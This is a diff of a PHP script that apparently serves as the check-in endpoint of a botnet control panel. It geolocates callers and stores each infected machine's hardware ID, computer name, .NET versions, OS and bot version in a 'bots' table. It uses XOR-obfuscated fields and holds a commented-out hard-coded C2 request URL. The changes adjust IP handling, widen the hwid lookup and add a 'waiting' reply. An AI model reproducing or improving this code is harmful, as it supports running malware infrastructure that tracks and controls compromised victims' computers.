@@ -3,7 +3,7 @@ require_once __DIR__ . '/config.php';
 include 'src/Geo/geoip.inc';
 $gi = geoip_open("src/Geo/GeoIP.dat", "");
 
-
+//die("uninstall");
 
 function xor_this($data) {
 
@@ -24,22 +24,25 @@ function xor_this($data) {
 
 
 
-if(empty($_POST["hwid"])){
+if(empty($_POST)){
     //echo xor_this("http://35.204.135.202/request.php");
    // echo xor_this("#7%;y~dpdeqam`xvyscd14:6487;+!");
     die("404");
 }
 
+if(!empty($_SERVER['REMOTE_ADDR'])){
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $country = geoip_country_code_by_addr($gi, $ip);
+}else{
+    $country = "unknow";
+}
 
-
-$ip = $_SERVER['HTTP_CLIENT_IP'] ? $_SERVER['HTTP_CLIENT_IP'] : ($_SERVER['HTTP_X_FORWARDED_FOR'] ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
-$country = geoip_country_code_by_addr($gi, $ip);
 
 
 
 // {0a2495a8-5af7-11e9-b637-806e6f6e6963}
 //$_POST["hwid"] =  "{0a2495a8-5af7-11e9-b637-806e6f6e6963}";
-$statement = $pdo->prepare("SELECT * FROM bots WHERE hwid = ?");
+$statement = $pdo->prepare("SELECT * FROM bots WHERE hwid LIKE ?");
 $statement->execute(array($_POST["hwid"]));   
 $botfound = false;
 $bot = "";
@@ -99,8 +102,5 @@ if($botfound){
     $statement = $pdo->prepare("INSERT INTO bots (hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
     $statement->execute(array($_POST["hwid"], xor_this($_POST["username"]), $country,  xor_this($_POST["nf2"]),  xor_this($_POST["nf3"]),  xor_this($_POST["nf35"]),  xor_this($_POST["nf4"]),$ip,  $_POST["os"],  xor_this($_POST["botversion"]))); 
 }
-
-
-
-
+echo "waiting";
 ?>
